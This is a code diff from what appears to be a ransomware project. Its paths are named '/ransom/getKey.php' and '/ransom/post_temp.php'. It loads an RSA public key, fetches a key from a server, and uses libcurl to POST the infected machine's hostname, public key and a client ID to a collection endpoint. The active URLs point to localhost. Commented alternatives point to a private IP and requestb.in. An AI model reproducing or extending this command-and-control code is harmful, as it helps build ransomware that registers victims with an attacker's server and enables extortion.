@@ -46,8 +46,6 @@ unsigned char* generate_key(const unsigned char* pubkey)
 	//generates the keys and store them in r
 	bufio = BIO_new_mem_buf((void*)pubkey, l);
 	r = PEM_read_bio_RSA_PUBKEY(bufio, 0, 0, 0);
-	//ret = RSA_generate_key_ex(r, bits, bne, NULL);
-	//d2i_RSAPublicKey(&r, &pubkey, l);
 
 
 	//if the generation failed, erase everything
@@ -107,11 +105,9 @@ const unsigned char* getKey() {
 		just as well be a https:// URL if that is what should receive the
 		data. */
 		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/ransom/getKey.php");
-		//curl_easy_setopt(curl, CURLOPT_URL, "http://172.16.96.9/ransom/getKey.php");
-
+		//curl_easy_setopt(curl, CURLOPT_URL, "http://172.16.48.36/getKey.php");
 
 		/* Perform the request, res will get the return code */
-
 		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
 		res = curl_easy_perform(curl);
@@ -157,15 +153,14 @@ int send_encrypted_msg(const unsigned char* cypher, const unsigned char* pubkey,
 		just as well be a https:// URL if that is what should receive the
 		data. */
 		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/ransom/post_temp.php");
-		//curl_easy_setopt(curl, CURLOPT_URL, "https://requestb.in/1fbd5kn1");
+		//curl_easy_setopt(curl, CURLOPT_URL, "http://172.16.48.36/post_temp.php");
+		//curl_easy_setopt(curl, CURLOPT_URL, "https://requestb.in/1ig0xhu1");
+		
 		/* Now specify the POST data */
-
 		string data = "machineName=" + hostname + "&publickey=" + key + "&id=" + idClient;
-		//cout << "\n\n\n" << data << "\n\n\n" << endl;
 		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
 
 		/* Perform the request, res will get the return code */
-
 		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
 		res = curl_easy_perform(curl);
